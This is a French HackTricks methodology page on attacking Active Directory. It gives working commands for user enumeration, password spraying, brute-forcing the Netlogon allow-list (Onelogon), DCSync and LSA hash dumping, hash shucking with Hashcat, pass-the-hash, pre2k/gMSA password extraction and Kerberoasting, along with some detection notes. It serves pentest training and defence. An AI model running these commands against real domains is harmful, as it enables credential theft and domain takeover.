# Méthodologie Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Vue d’ensemble

**Active Directory** est une technologie fondamentale qui permet aux **administrateurs réseau** de créer et de gérer efficacement des **domaines**, des **utilisateurs** et des **objets** au sein d’un réseau. Conçu pour évoluer, il facilite l’organisation d’un grand nombre d’utilisateurs en **groupes** et **sous-groupes** faciles à gérer, tout en contrôlant les **droits d’accès** à différents niveaux.

La structure d’**Active Directory** comporte trois niveaux principaux : les **domaines**, les **arbres** et les **forêts**. Un **domaine** regroupe des objets, tels que des **utilisateurs** ou des **appareils**, qui partagent une base de données commune. Les **arbres** sont des groupes de domaines liés par une structure commune, et une **forêt** regroupe plusieurs arbres interconnectés par des **relations d’approbation**, formant ainsi le niveau supérieur de la structure organisationnelle. Des **droits d’accès** et de **communication** spécifiques peuvent être définis à chacun de ces niveaux.

Les concepts clés d’**Active Directory** sont les suivants :

1. **Annuaire** – Contient toutes les informations relatives aux objets Active Directory.
2. **Objet** – Désigne les entités de l’annuaire, notamment les **utilisateurs**, les **groupes** ou les **dossiers partagés**.
3. **Domaine** – Conteneur d’objets d’annuaire. Plusieurs domaines peuvent coexister au sein d’une **forêt**, chacun gérant sa propre collection d’objets.
4. **Arbre** – Groupe de domaines partageant un domaine racine commun.
5. **Forêt** – Niveau supérieur de la structure organisationnelle d’Active Directory, composé de plusieurs arbres liés par des **relations d’approbation**.

**Active Directory Domain Services (AD DS)** regroupe divers services essentiels à la gestion centralisée et à la communication au sein d’un réseau. Ces services comprennent :

1. **Services de domaine** – Centralisent le stockage des données et gèrent les interactions entre les **utilisateurs** et les **domaines**, notamment les fonctionnalités d’**authentification** et de **recherche**.
2. **Services de certificats** – Gèrent la création, la distribution et l’administration de **certificats numériques** sécurisés.
3. **Services d’annuaire léger** – Prennent en charge les applications compatibles avec les annuaires via le **protocole LDAP**.
4. **Services de fédération d’annuaires** – Fournissent des fonctionnalités d’**authentification unique** permettant d’authentifier les utilisateurs sur plusieurs applications web au cours d’une même session.
5. **Gestion des droits** – Contribue à protéger les œuvres protégées par le droit d’auteur en réglementant leur distribution et leur utilisation non autorisées.
6. **Service DNS** – Indispensable à la résolution des **noms de domaine**.

Pour une explication plus détaillée, consultez : [**TechTerms - Définition d’Active Directory**](https://techterms.com/definition/active_directory)

### **Authentification Kerberos**

Pour apprendre à **attaquer un AD**, vous devez **bien comprendre** le **processus d’authentification Kerberos**.\
[**Consultez cette page si vous ne savez pas encore comment il fonctionne.**](kerberos-authentication.md)

## Aide-mémoire

Vous pouvez consulter [https://wadcoms.github.io/](https://wadcoms.github.io) pour voir rapidement quelles commandes permettent d’énumérer ou d’exploiter un AD.

> [!WARNING]
> Les communications Kerberos **nécessitent généralement un nom de domaine complet (FQDN)** afin que le client puisse obtenir un ticket pour le SPN approprié. L’accès à une machine par adresse IP utilise souvent NTLM plutôt que Kerberos.

## Reconnaissance Active Directory (sans identifiants/sessions)

Si vous avez accès à un environnement AD, mais ne disposez d’aucun identifiant ni d’aucune session, vous pouvez :

- **Pentester le réseau :**
  - Analyser le réseau, repérer les machines et les ports ouverts, puis tenter d’**exploiter les vulnérabilités** ou d’**extraire des identifiants** (par exemple, [les imprimantes peuvent être des cibles très intéressantes](ad-information-in-printers.md)).
  - L’énumération DNS peut révéler des informations sur les serveurs clés du domaine, tels que les serveurs web, les imprimantes, les partages, les VPN, les médias, etc.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Consultez la [**méthodologie générale de pentest**](../../generic-methodologies-and-resources/pentesting-methodology.md) pour en savoir plus.
- **Vérifier si l’accès null et Guest est autorisé sur les services SMB** (cela ne fonctionnera pas sur les versions modernes de Windows) :
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Vous trouverez un guide plus détaillé sur l’énumération d’un serveur SMB ici :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Énumérer LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Vous trouverez un guide plus détaillé sur l’énumération de LDAP ici (prêtez une **attention particulière à l’accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Empoisonner le réseau**
  - Récupérer des identifiants en [**usurpant des services avec Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Accéder à un hôte en [**abusant de l’attaque relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Récupérer des identifiants en **exposant** de [**faux services UPnP avec evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html) :
  - Extraire des noms d’utilisateur et des noms à partir de documents internes, des réseaux sociaux, des services (principalement web) présents dans les environnements du domaine, ainsi que des sources accessibles au public.
  - Si vous trouvez les noms complets des employés de l’entreprise, vous pouvez essayer différentes **conventions de nom d’utilisateur AD (**[**à lire**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Les conventions les plus courantes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chaque nom), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettres aléatoires et 3 chiffres aléatoires_ (abc123).
  - Outils :
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Énumération des utilisateurs

- **Énumération anonyme SMB/LDAP :** consultez les pages [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Énumération avec Kerbrute** : lorsqu’un **nom d’utilisateur invalide est demandé**, le serveur répond avec le code d’**erreur Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ce qui permet de déterminer que le nom d’utilisateur est invalide. Pour les **noms d’utilisateur valides**, la réponse contiendra soit le **TGT dans une réponse AS-REP**, soit l’erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l’utilisateur doit effectuer une pré-authentification.
- **Aucune authentification auprès de MS-NRPC** : utiliser auth-level = 1 (sans authentification) auprès de l’interface MS-NRPC (Netlogon) des contrôleurs de domaine. Après s’être lié à l’interface MS-NRPC, cette méthode appelle la fonction `DsrGetDcNameEx2` pour vérifier si l’utilisateur ou l’ordinateur existe, sans aucun identifiant. L’outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d’énumération. L’étude est disponible [ici](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **Serveur OWA (Outlook Web Access)**

Si vous avez trouvé l’un de ces serveurs sur le réseau, vous pouvez également effectuer une **énumération des utilisateurs** contre celui-ci. Par exemple, vous pouvez utiliser l’outil [**MailSniper**](https://github.com/dafthack/MailSniper) :

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Vous trouverez des listes de noms d’utilisateur dans [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) et dans celui-ci ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Cependant, vous devriez déjà connaître les **noms des personnes travaillant dans l’entreprise**, grâce à l’étape de recon que vous auriez dû effectuer au préalable. À partir du prénom et du nom, vous pouvez utiliser le script [**namemash.py**](https://gist.github.com/superkojiman/11076951) pour générer des noms d’utilisateur potentiellement valides.

### Abus de la liste d’autorisation des canaux vulnérables Netlogon (Onelogon)

Même après l’application du correctif **Zerologon** sur le DC, les comptes explicitement autorisés peuvent toujours être exposés au **comportement vulnérable des canaux sécurisés Netlogon hérités**. La configuration risquée est la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ou la valeur de registre correspondante **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Cette valeur est un **descripteur de sécurité SDDL** (voir [Security Descriptors](security-descriptors.md)). Tout compte ou groupe auquel l’ACE correspondant est accordé dans la DACL peut être ciblé. Par exemple, `O:BAG:BAD:(A;;RC;;;WD)` autorise effectivement **Everyone**.

Déroulement pratique pour l’opérateur :

1. **Identifiez les principaux autorisés** en vérifiant à la fois **SYSVOL/GPO** et le **registre du DC en ligne**.
2. **Résolvez les SID** présents dans le SDDL pour retrouver les utilisateurs/ordinateurs AD correspondants et donnez la priorité aux **comptes machine des DC**, aux **comptes d’approbation** et aux autres machines privilégiées.
3. Réessayez à plusieurs reprises l’**authentification MS-NRPC / Netlogon** avec le compte autorisé.
4. Après une tentative réussie, exploitez la **définition du mot de passe Netlogon** pour réinitialiser le mot de passe du compte ciblé (le PoC public le définit sur une chaîne vide).<sup>[[9]](#references)[[10]](#references)</sup>

Exemples rapides de triage / laboratoire tirés de l’artefact public :

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notes :

- Le **scanner** est utile, car l’allow-list effective peut se trouver dans **SYSVOL**, dans le **registry**, ou dans les deux.
- Le chemin d’exploitation lui-même est important, car il **ne nécessite pas de privilèges Domain Admin** une fois qu’un compte vulnérable a été identifié.
- La compromission d’un **compte machine de Domain Controller**, tel que `DC$`, est particulièrement dangereuse, car la réinitialisation de son mot de passe peut directement ouvrir des voies plus larges de **prise de contrôle d’AD**.
- La faisabilité du **brute-force** dépend du mode : l’artifact public décrit une approche meet-in-the-middle, un **brute-force de 24 bits** lorsqu’un autre compte ordinateur est disponible, ainsi que des variantes **de 32 bits** plus lentes.

Notes de détection et de hardening :

- Auditez la stratégie d’allow-list et supprimez tout élément autre que les exceptions temporaires de compatibilité explicitement nécessaires.
- Surveillez les événements **5827/5828/5829/5830/5831** du **System** des DC afin de repérer les connexions Netlogon vulnérables refusées, détectées ou explicitement autorisées par la stratégie.
- Considérez les comptes dans `VulnerableChannelAllowList` comme **à haut risque** tant que la dépendance legacy n’a pas été supprimée.

### Connaître un ou plusieurs noms d’utilisateur

Bon, vous savez donc déjà que vous avez un nom d’utilisateur valide, mais aucun mot de passe... Essayez alors :

- [**ASREPRoast**](asreproast.md) : si un utilisateur **n’a pas** l’attribut _DONT_REQ_PREAUTH_, vous pouvez **demander un message AS_REP** pour cet utilisateur, qui contiendra des données chiffrées à l’aide d’une dérivation du mot de passe de l’utilisateur.
- [**Password Spraying**](password-spraying.md) : essayons les mots de passe les plus **courants** avec chacun des utilisateurs découverts ; peut-être qu’un utilisateur utilise un mauvais mot de passe (gardez la stratégie de mots de passe à l’esprit !).
  - Notez que vous pouvez également effectuer un **spray** sur des serveurs OWA pour essayer d’accéder aux serveurs de messagerie des utilisateurs.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Vous pourriez **obtenir** des **hashes** de challenge en effectuant du **poisoning** sur certains protocoles du **réseau** :


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

L’énumération d’Active Directory fournit des noms d’utilisateur, des identifiants de messagerie et des modèles de nommage, des hôtes candidats ainsi que des services susceptibles d’être contraints à s’authentifier. Utilisez ces informations pour identifier les [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM réalisables et les voies d’accès potentielles à l’environnement AD.

### Reconnaissance basée sur les workspaces de NetExec et vérifications de la posture de relay

- Utilisez les **workspaces `nxcdb`** pour conserver l’état de reconnaissance AD de chaque mission : `workspace create <name>` crée des bases de données SQLite par protocole dans `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Changez de vue avec `proto smb|mssql|winrm` et répertoriez les secrets collectés avec `creds`. Supprimez manuellement les données sensibles une fois terminé : `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Une découverte rapide du sous-réseau avec **`netexec smb <cidr>`** révèle le **domaine**, la **version de l’OS**, les **exigences de signature SMB** et l’**authentification Null**. Les membres indiquant `(signing:False)` sont **vulnérables au relay**, tandis que les DC exigent souvent la signature.
- Générez des **noms d’hôtes dans /etc/hosts** directement à partir de la sortie de NetExec pour faciliter le ciblage :

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Lorsque le **SMB relay vers le DC est bloqué** par la signature, vérifiez tout de même la configuration **LDAP** : `netexec ldap <dc>` signale `(signing:None)` / une faible channel binding. Un DC qui exige la signature SMB mais dont la signature LDAP est désactivée reste une cible viable pour le **relay-to-LDAP** et des abus comme le **SPN-less RBCD**.

### Fuites d’identifiants côté client via les imprimantes → validation en masse des identifiants du domaine

- Les interfaces Web des imprimantes contiennent parfois des **mots de passe admin masqués dans le HTML**. L’affichage du code source ou l’inspection avec les outils de développement peut révéler le texte en clair (par ex. `<input value="<password>">`), permettant un accès Basic-auth aux dépôts de scan/impression.
- Les travaux d’impression récupérés peuvent contenir des **documents d’intégration en texte brut** avec les mots de passe de chaque utilisateur. Veillez à conserver les associations lors des tests :<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Voler des identifiants NTLM

Si vous pouvez **accéder à d’autres PC ou partages** avec l’**utilisateur null ou guest**, vous pourriez **déposer des fichiers** (comme un fichier SCF) qui, s’ils sont consultés d’une manière ou d’une autre, vous permettront de décl**encher** une authentification NTLM contre vous afin de **voler** le **challenge NTLM** pour le casser :

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Le **hash shucking** traite chaque hash NT que vous possédez déjà comme un mot de passe candidat pour d’autres formats plus lents, dont le matériel de clé est directement dérivé du hash NT. Au lieu de brute-forcer de longues phrases de passe dans des tickets Kerberos RC4, des challenges NetNTLM ou des identifiants mis en cache, vous fournissez les hash NT aux modes NT-candidate de Hashcat, qui vérifie la réutilisation sans jamais révéler le texte en clair. Cette technique est particulièrement efficace après la compromission d’un domaine, lorsque vous pouvez récupérer des milliers de hash NT actuels et historiques.<sup>[[5]](#references)</sup>

Utilisez le shucking lorsque :

- Vous disposez d’un corpus de hash NT obtenu par DCSync, à partir de dumps SAM/SECURITY ou de coffres d’identifiants, et devez tester leur réutilisation dans d’autres domaines/forêts.
- Vous capturez du matériel Kerberos basé sur RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), des réponses NetNTLM ou des blobs DCC/DCC2.
- Vous souhaitez démontrer rapidement la réutilisation de longues phrases de passe impossibles à casser, puis pivoter immédiatement via Pass-the-Hash.

Cette technique **ne fonctionne pas** contre les types de chiffrement dont les clés ne sont pas le hash NT (par exemple, Kerberos etype 17/18 AES). Si un domaine impose AES uniquement, vous devez revenir aux modes de mots de passe classiques.

#### Création d’un corpus de hash NT

- **DCSync/NTDS** – Utilisez `secretsdump.py` avec l’historique pour récupérer le plus grand ensemble possible de hash NT (et leurs valeurs précédentes) :

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Les entrées d’historique élargissent considérablement l’ensemble des candidats, car Microsoft peut stocker jusqu’à 24 anciens hashes par compte. Pour découvrir d’autres façons de récupérer des secrets NTDS, consultez :

{{#ref}}
dcsync.md
{{#endref}}

- **Dumps du cache des endpoints** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données locales SAM/SECURITY et les identifiants de connexion au domaine mis en cache (DCC/DCC2). Supprimez les doublons et ajoutez ces hashes à la même liste `nt_candidates.txt`.
- **Suivre les métadonnées** – Conservez le nom d’utilisateur/domaine associé à chaque hash (même si la wordlist ne contient que des valeurs hexadécimales). Lorsque Hashcat affiche le candidat gagnant, les hashes correspondants vous indiquent immédiatement quel principal réutilise un mot de passe.
- Privilégiez les candidats issus de la même forêt ou d’une forêt approuvée ; cela maximise les chances de chevauchement lors du shucking.

#### Modes NT-candidate de Hashcat

| Type de hash                             | Mode mot de passe | Mode NT-candidate |
| ---------------------------------------- | ----------------- | ----------------- |
| Identifiants de domaine mis en cache (DCC) | 1100          | 31500             |
| Identifiants de domaine mis en cache 2 (DCC2) | 2100       | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500              | 27000             |
| NetNTLMv2                                | 5600              | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500              | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100             | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200             | 35400             |

Remarques :

- Les entrées NT-candidate **doivent rester des hashes NT bruts de 32 caractères hexadécimaux**. Désactivez les moteurs de règles (pas de `-r`, pas de modes hybrides), car les modifications corrompent le matériau de clé candidat.
- Ces modes ne sont pas intrinsèquement plus rapides, mais l’espace de clés NTLM (~30 000 MH/s sur un M3 Max) est environ 100 fois plus rapide que Kerberos RC4 (~300 MH/s). Tester une liste NT sélectionnée coûte bien moins cher que d’explorer tout l’espace des mots de passe dans le format lent.
- Utilisez toujours la **dernière build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), car les modes 31500/31600/35300/35400 sont sortis récemment.<sup>[[7]](#references)</sup>
- Il n’existe actuellement aucun mode NT pour AS-REQ Pre-Auth, et les etypes AES (19600/19700) nécessitent le mot de passe en clair, car leurs clés sont dérivées des mots de passe UTF-16LE via PBKDF2, et non des hashes NT bruts.

#### Exemple – Kerberoast RC4 (mode 35300)

1. Capturez un TGS RC4 pour un SPN cible avec un utilisateur à faibles privilèges (consultez la page Kerberoast pour plus de détails) :

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Récupérez le ticket avec votre liste NT :

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat dérive la clé RC4 à partir de chaque candidat NT et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l’un de vos hachages NT existants.

3. Effectuez immédiatement un pivot via PtH :

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Vous pouvez éventuellement récupérer le texte en clair plus tard avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.

#### Exemple – Identifiants mis en cache (mode 31600)

1. Extraire les connexions mises en cache d’un poste de travail compromis :

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Copiez la ligne DCC2 de l'utilisateur du domaine qui vous intéresse dans `dcc2_highpriv.txt` et craquez-la :

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Une correspondance réussie révèle le hash NT déjà connu dans votre liste, ce qui prouve que l’utilisateur mis en cache réutilise un mot de passe. Utilisez-le directement pour PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou lancez une attaque par force brute en mode NTLM rapide pour retrouver le mot de passe en clair.

Le même workflow s’applique aux réponses aux challenges NetNTLM (`-m 27000/27100`) et à DCC (`-m 31500`). Dès qu’une correspondance est identifiée, vous pouvez lancer un relay, utiliser PtH via SMB/WMI/WinRM ou tenter de retrouver le hash NT hors ligne avec des masques/règles.



## Énumération d’Active Directory AVEC des identifiants/session

Pour cette phase, vous devez avoir **compromis les identifiants ou une session d’un compte de domaine valide.** Si vous disposez d’identifiants valides ou d’un shell en tant qu’utilisateur du domaine, **n’oubliez pas que les options indiquées précédemment restent utilisables pour compromettre d’autres utilisateurs**.

Avant de commencer l’énumération authentifiée, comprenez le **problème du double-hop Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Énumération

La compromission d’un compte constitue une **étape majeure dans l’évaluation du domaine**, car elle permet l’**énumération authentifiée d’Active Directory** :

Concernant [**ASREPRoast**](asreproast.md), vous pouvez désormais trouver tous les utilisateurs potentiellement vulnérables. Concernant le [**Password Spraying**](password-spraying.md), vous pouvez obtenir une **liste de tous les noms d’utilisateur** et essayer le mot de passe du compte compromis, des mots de passe vides et de nouveaux mots de passe prometteurs.

- Vous pouvez utiliser la [**CMD pour effectuer une reconnaissance de base**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez aussi utiliser [**powershell pour la reconnaissance**](../basic-powershell-for-pentesters/index.html), ce qui sera plus furtif
- Vous pouvez également [**utiliser powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil remarquable pour la reconnaissance dans un Active Directory est [**BloodHound**](bloodhound.md). Il **n’est pas très furtif** (selon les méthodes de collecte utilisées), mais **si cela ne vous préoccupe pas**, essayez-le. Repérez les utilisateurs qui peuvent se connecter en RDP, trouvez des chemins vers d’autres groupes, etc.
  - **Parmi les autres outils automatisés d’énumération AD, on trouve :** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Examinez les [**enregistrements DNS de l’AD**](ad-dns-records.md), qui peuvent contenir des informations intéressantes.
- **AdExplorer.exe**, de la suite **SysInternal**, est un **outil avec interface graphique** que vous pouvez utiliser pour énumérer l’annuaire.
- Vous pouvez aussi effectuer des recherches dans la base de données LDAP avec **ldapsearch** pour trouver des identifiants dans les champs _userPassword_ et _unixUserPassword_, ou dans les notes _description_ et _info_ des utilisateurs. Un jeton non étiqueté dans _info_ qui ressemble à un mot de passe n’est qu’un candidat : vérifiez séparément sa fonction et sa validité, et évitez d’inclure le contenu des notes dans la sortie d’énumération habituelle. Consultez [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d’autres méthodes.
- Examinez les scripts **accessibles** de connexion au domaine et de mappage de lecteurs dans `\\<dc>\NETLOGON` ou `\\<dc>\SYSVOL\<domain>\scripts`, si les autorisations le permettent. [Microsoft documente](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) le rôle du répertoire de scripts du partage NETLOGON. Commencez par lister les noms, puis examinez uniquement les scripts pertinents et lisibles, dans la limite d’une taille définie ; ne copiez pas l’intégralité d’un partage et n’affichez pas les valeurs d’identifiants lors d’une énumération habituelle. Un appel PowerShell à [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **ne protège pas** un mot de passe littéral stocké dans le script. Cet appel ne prouve pas à lui seul qu’un secret est codé en dur : retracez la valeur qui lui est réellement transmise, puis vérifiez séparément le compte, la validité des identifiants et les privilèges. L’examen d’un script de domaine sur un partage distant est distinct de l’énumération d’un hôte local.
- Si vous utilisez **Linux**, vous pouvez aussi énumérer le domaine avec [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pouvez également essayer des outils automatisés tels que :
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraction de tous les utilisateurs du domaine**

  Il est très facile d’obtenir tous les noms d’utilisateur du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section sur l’énumération semble courte, c’est la partie la plus importante. Consultez les liens (principalement ceux sur cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et entraînez-vous jusqu’à être à l’aise. Lors d’une évaluation, c’est le moment clé pour trouver un chemin vers DA ou déterminer qu’il n’y a rien à faire.

### Comptes d’ordinateur précréés prévisibles -> accès au mot de passe gMSA

Les comptes d’ordinateur préparés pour les jonctions héritées peuvent conserver un mot de passe initial prévisible. Le module `pre2k` de NetExec identifie la valeur caractéristique de `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) et tente d’obtenir un TGT Kerberos avec les 14 premiers caractères du nom d’ordinateur en minuscules, sans le `$` final. Considérez cette valeur UAC comme un critère de sélection des candidats, plutôt que de supposer que l’appartenance à **Pre-Windows 2000 Compatible Access** prouve à elle seule que le mot de passe est faible.<sup>[[18]](#references)[[20]](#references)</sup>

Utilisez l’énumération LDAP authentifiée pour tester les candidats et enregistrer les TGT obtenus. `ALL=True` étend les tests aux objets qui ne correspondent pas au filtre par défaut `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Un bind par défaut/NTLM qui échoue n’invalide **pas** ce constat : testez avec `-k`, un FQDN qui se résout vers le DC et une horloge synchronisée avec le KDC. Les exécutions réussies du module écrivent les listes de candidats et les ccaches obtenus sous `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Après avoir compromis le principal d’ordinateur, cartographiez ses appartenances à des groupes imbriqués et ses droits sortants. En particulier, les principaux nommés dans le descripteur de sécurité `msDS-GroupMSAMembership` d’un gMSA peuvent lire `msDS-ManagedPassword` ; la sortie `--gmsa` de NetExec indique les principaux autorisés et renvoie le hash NT actuel lorsque l’ordinateur utilisé pour l’authentification est autorisé.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Évaluez ensuite le gMSA récupéré comme n’importe quel autre identifiant : examinez les appartenances aux groupes locaux et de domaine, les droits d’ouverture de session, les SPN, la délégation et les services accessibles avant de tenter un pass-the-hash. Cette méthode de récupération basée sur les ACL est distincte de [Golden gMSA/dMSA](golden-dmsa-gmsa.md), qui permet de dériver les mots de passe gérés après la compromission de la clé racine KDS.<sup>[[20]](#references)</sup>

Un principal ordinateur peut également avoir un contrôle sortant sur d’autres objets ordinateur ou groupes. Après en avoir obtenu un, examinez séparément ses appartenances imbriquées et ses ACL effectives : un droit d’écriture sur un autre objet ordinateur peut permettre de modifier un compte, et des droits d’appartenance à un groupe peuvent donner accès à un rôle de connexion. Un indicateur de compte préparé, une convention de nommage prévisible ou une relation `GenericWrite` ne prouvent pas à eux seuls que le chemin complet est exploitable.

Une copie lisible d’un blob `msDS-ManagedPassword` dans un fichier, un partage ou une sauvegarde constitue une voie d’exposition distincte : l’ACL de lecture LDAP ne protège pas une copie stockée ailleurs. Vérifiez qu’il s’agit bien d’un blob de mot de passe géré avant de l’interpréter, et faites la distinction entre cette situation, une lecture LDAP autorisée et la dérivation à partir de la clé racine KDS.

### Kerberoast

Le Kerberoasting consiste à obtenir des **tickets TGS** utilisés par des services associés à des comptes utilisateur et à casser leur chiffrement — basé sur les mots de passe des utilisateurs — **hors ligne**.

Pour en savoir plus :

{{#ref}}
kerberoast.md
{{#endref}}

